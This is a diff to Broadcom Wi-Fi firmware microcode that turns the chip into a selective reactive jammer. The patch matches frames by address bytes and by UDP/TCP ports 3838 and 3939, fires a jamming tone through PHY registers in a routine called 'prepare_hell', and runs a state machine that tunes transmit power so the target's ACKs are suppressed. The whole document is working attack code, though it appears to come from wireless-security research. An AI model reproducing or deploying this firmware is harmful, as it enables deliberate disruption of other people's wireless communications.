@@ -1,0 +1,261 @@
+--- ../gen/ucode.asm	2017-05-30 00:12:22.184098274 +0200
++++ ucode-jammer-full-frm.asm	2017-05-30 00:15:59.812237623 +0200
+@@ -3,0 +4,38 @@
++#include "../include/macros.inc"
++#include "../include/wlc_phyreg_ac.inc"
++#define SPARE1 r54
++#define SPARE2 r55
++#define SPARE3 r56
++#define PHY400 r57
++#define SPARE4 r58
++#define SPINNING r60
++#define TONE_REPETITION 36
++#define QOSDATA [SHM(0x1340)]
++#define BEACON [SHM(0x1342)]
++#define OTHER [SHM(0x1344)]
++#define PACK3838 [SHM(0x1346)]
++#define PACK3939 [SHM(0x1348)]
++#define PACKLATE [SHM(0x134A)]
++#define SENDACK3838 [SHM(0x134C)]
++#define SENDACK3939 [SHM(0x134E)]
++#define DELTACLOCK1 [SHM(0x1350)]
++#define DELTACLOCK2 [SHM(0x1352)]
++#define DELTACLOCK3 [SHM(0x1354)]
++#define CLOCKREAD [SHM(0x1356)]
++#define PGA_NEXT [SHM(0x1358)]
++#define IPA_NEXT [SHM(0x135A)]
++#define TXGM_NEXT [SHM(0x135C)]
++#define BBMULT_NEXT [SHM(0x135E)]
++#define TARGETTOTAL [SHM(0x1360)]
++#define ACKTRANSMITTED [SHM(0x1362)]
++#define TARGETRECEIVED [SHM(0x1364)]
++#define TARGETNAV [SHM(0x1366)]
++#define STATE_JAMMER [SHM(0x1370)]
++#define STATE_LEARNING 0
++#define STATE_JAMACK 1
++#define STATE_CHECK 2
++#define ACKMAC1 [SHM(0x1380)]
++#define ACKMAC2 [SHM(0x1382)]
++#define ACKMAC3 [SHM(0x1384)]
++#define WAITACK [SHM(0x1386)]
++#define CLOCKACKTO [SHM(0x1388)]
+@@ -31,0 +70,10 @@
++ je SPINNING, 0, keep_spinning
++ mov 0x403, r33
++ calls L52
++ jnzxh SPR_Ext_IHR_Data & 0x1, keep_spinning
++ mov 0x400, r33
++ mov PHY400, r34
++ calls L54
++ mov 0, SPINNING
++ sub SPR_TSF_WORD0, CLOCKREAD, DELTACLOCK2
++keep_spinning:
+@@ -2590 +2638,2 @@
+- orx 2, 0, 0x2, SPR_BRC, SPR_BRC
++ jne STATE_JAMMER, STATE_JAMACK, never_tx_ack
++never_tx_ack:
+@@ -2591,0 +2641,5 @@
++ je SENDACK3838, 0, skipacktrace+
++skipacktrace:
++ je SENDACK3939, 0, skipacktrace+
++ calls prepare_hell
++skipacktrace:
+@@ -2708,0 +2763,5 @@
++ mov SPR_TSF_WORD0, CLOCKREAD
++ mov 0, SPINNING
++ mov 0, SENDACK3838
++ mov 0, SENDACK3939
++ mov 0, TARGETRECEIVED
+@@ -2853,0 +2913,152 @@
++#define SPIN_LENGTH (6 + 26 + 8 + 20 + 8)
++#define MIN_LENGTH 10
++spin_rx_header:
++ jext COND_RX_COMPLETE, spin_rx_end
++ jl SPR_RXE_FRAMELEN, SPIN_LENGTH, spin_rx_header
++spin_rx_end:
++ jl SPR_RXE_FRAMELEN, MIN_LENGTH, skip+
++ mov 0x454e, SPARE1
++ jne [5,off1], SPARE1, L652
++ mov 0x4d58, SPARE1
++ jne [6,off1], SPARE1, L652
++ mov 0x4e4f, SPARE1
++ jne [7,off1], SPARE1, L652
++ mov 0x414a, SPARE1
++ jne [8,off1], SPARE1, L652
++ mov 0x4d4d, SPARE1
++ jne [9,off1], SPARE1, L652
++ mov 0x5245, SPARE1
++ jne [10,off1], SPARE1, L652
++#define TYPE_QOS_DATA 0x88
++#define TYPE_BEACON 0x80
++#define TYPE_ACK 0xd4
++ and [3,off1], 0xff, SPARE1
++ jne SPARE1, TYPE_ACK, not_ack
++#define MIN_ACK_LENGTH (6 + 14)
++ jl SPR_RXE_FRAMELEN, MIN_ACK_LENGTH, skip+
++ je WAITACK, 0, skip+
++ mov ACKMAC1, SPARE1
++ jne [5,off1], SPARE1, skip+
++ mov ACKMAC2, SPARE1
++ jne [6,off1], SPARE1, skip+
++ mov ACKMAC3, SPARE1
++ jne [7,off1], SPARE1, skip+
++ add CLOCKACKTO, 40, CLOCKACKTO
++ jg SPR_TSF_WORD0, CLOCKACKTO, skip+
++ je STATE_JAMMER, STATE_JAMACK, skip_count+
++ add ACKTRANSMITTED, 1, ACKTRANSMITTED
++skip_count:
++ jmp skip+
++not_ack:
++ jne SPARE1, TYPE_QOS_DATA, not_qos_data
++ add QOSDATA, 1, QOSDATA
++ jl SPR_RXE_FRAMELEN, SPIN_LENGTH, skip+
++ and [20,off1], 0xff, SPARE1
++ jne SPARE1, 0x45, skip+
++ sr [24,off1], 8, SPARE1
++ je SPARE1, 0x11, protocol_found+
++ je SPARE1, 0x06, protocol_found+
++ jmp skip+
++protocol_found:
++ mov 0xFE0E, SPARE1
++ je [30,off1], SPARE1, port_found+
++ je [31,off1], SPARE1, port_found+
++ jmp nextport+
++port_found:
++ add PACK3838, 1, PACK3838
++ jext COND_RX_COMPLETE, too_late
++ mov 1, SENDACK3838
++ jmp skip+
++nextport:
++ mov 0x630F, SPARE1
++ je [30,off1], SPARE1, port_found+
++ je [31,off1], SPARE1, port_found+
++ jmp skip+
++port_found:
++ add PACK3939, 1, PACK3939
++ jext COND_RX_COMPLETE, too_late
++ mov 1, SENDACK3939
++ mov 1, TARGETRECEIVED
++ mov STATE_JAMACK, STATE_JAMMER
++ mov 0, TARGETTOTAL
++ jne STATE_JAMMER, STATE_LEARNING, next_state+
++#define WINDOW_LEARN 16
++ jl TARGETTOTAL, WINDOW_LEARN, window_not_reached+
++#define THRESH_LEARN_SWITCHTOJAMACK 0
++ jg ACKTRANSMITTED, THRESH_LEARN_SWITCHTOJAMACK, keep_state+
++ mov STATE_JAMACK, STATE_JAMMER
++ mov 0, TARGETTOTAL
++ mov 0, ACKTRANSMITTED
++ jmp state_end
++keep_state:
++#define THRESHOLD_LEARN_CHANGEPOWER 3
++ jl ACKTRANSMITTED, THRESHOLD_LEARN_CHANGEPOWER, dont_increase_power
++#define POWER_ADD_INCREASE 10
++ add PGA_NEXT, POWER_ADD_INCREASE, PGA_NEXT
++dont_increase_power:
++ mov 0, TARGETTOTAL
++ mov 0, ACKTRANSMITTED
++window_not_reached:
++ mov [4,off1], TARGETNAV
++ mov [8,off1], ACKMAC1
++ mov [9,off1], ACKMAC2
++ mov [10,off1], ACKMAC3
++ jmp state_end
++next_state:
++ jne STATE_JAMMER, STATE_JAMACK, next_state+
++#define WINDOW_JAMACK 128
++ jl TARGETTOTAL, WINDOW_JAMACK, window_not_reached+
++ mov STATE_CHECK, STATE_JAMMER
++ mov 0, TARGETTOTAL
++ mov 0, ACKTRANSMITTED
++window_not_reached:
++ jmp state_end
++next_state:
++ jne STATE_JAMMER, STATE_CHECK, next_state+
++#define WINDOW_CHECK 4
++ jl TARGETTOTAL, WINDOW_CHECK, window_not_reached+
++ jg ACKTRANSMITTED, 1, go_back_learning
++ je ACKTRANSMITTED, 1, increase_power
++#define POWER_SMALL 1
++ sub PGA_NEXT, POWER_SMALL, PGA_NEXT
++ jmp finalise
++increase_power:
++ add PGA_NEXT, POWER_SMALL, PGA_NEXT
++finalise:
++ mov STATE_JAMACK, STATE_JAMMER
++ mov 0, TARGETTOTAL
++ mov 0, ACKTRANSMITTED
++ jmp state_end
++go_back_learning:
++ mov STATE_LEARNING, STATE_JAMMER
++ mov 0, TARGETTOTAL
++ mov 0, ACKTRANSMITTED
++window_not_reached:
++ mov [4,off1], TARGETNAV
++ mov [8,off1], ACKMAC1
++ mov [9,off1], ACKMAC2
++ mov [10,off1], ACKMAC3
++next_state:
++state_end:
++ add TARGETTOTAL, 1, TARGETTOTAL
++#define PGA_MAXIMUM 255
++ jles PGA_NEXT, PGA_MAXIMUM, check_lower
++ mov PGA_MAXIMUM, PGA_NEXT
++check_lower:
++#define PGA_MINIMUM 5
++ jgs PGA_NEXT, PGA_MINIMUM, power_done
++ mov PGA_MINIMUM, PGA_NEXT
++power_done:
++ jmp skip+
++too_late:
++ add PACKLATE, 1, PACKLATE
++ jmp skip+
++not_qos_data:
++ jne SPARE1, TYPE_BEACON, not_beacon
++ add BEACON, 1, BEACON
++ jmp found+
++not_beacon:
++ add OTHER, 1, OTHER
++found:
++skip:
++ mov 0, WAITACK
+@@ -3239,0 +3451,3 @@
++ je SENDACK3939, 0, skipclock+
++ sub SPR_TSF_WORD0, CLOCKREAD, DELTACLOCK3
++skipclock:
+@@ -3291,0 +3506,6 @@
++ je STATE_JAMMER, STATE_JAMACK, skip_ackto
++ je TARGETRECEIVED, 0, skip_ackto
++ add SPR_TSF_WORD0, TARGETNAV, CLOCKACKTO
++ mov 1, WAITACK
++skip_ackto:
++ jne SENDACK3939, 0, L588
+@@ -3382,0 +3603,5 @@
++ je SENDACK3838, 0, skip_sched_ack+
++skip_sched_ack:
++ je SENDACK3939, 0, skip_sched_ack+
++ mov 0x4001, r17
++skip_sched_ack:
+@@ -3758,0 +3984,6 @@
++ je SENDACK3838, 0, skipack+
++ jmp L442
++skipack:
++ je SENDACK3939, 0, skipack+
++ jmp L442
++skipack:
+@@ -6933,0 +7165,15 @@
++ rets
++prepare_hell:
++ sub SPR_TSF_WORD0, CLOCKREAD, DELTACLOCK1
++ sl PGA_NEXT, 8, SPARE1
++ or SPARE1, 0xff, SPARE1
++ phy_reg_and(ACPHY_macbasedDACPlay(rev), 0xFFFE)
++ phy_reg_write(ACPHY_sampleDepthCount(rev), 511)
++ phy_reg_write(ACPHY_sampleLoopCount(rev), TONE_REPETITION)
++ phy_reg_write(ACPHY_sampleInitWaitCount(rev), 0)
++ phy_reg_read(ACPHY_RfseqMode(rev), PHY400)
++ phy_reg_or(ACPHY_RfseqMode(rev), ACPHY_RfseqMode_CoreActv_override_MASK(rev))
++ phy_reg_and(ACPHY_sampleCmd(rev), 0xfffa)
++ phy_reg_and(ACPHY_iqloCalCmdGctl(0), 0x3fff)
++ phy_reg_or(ACPHY_sampleCmd(rev), 1)
++ mov 1, SPINNING
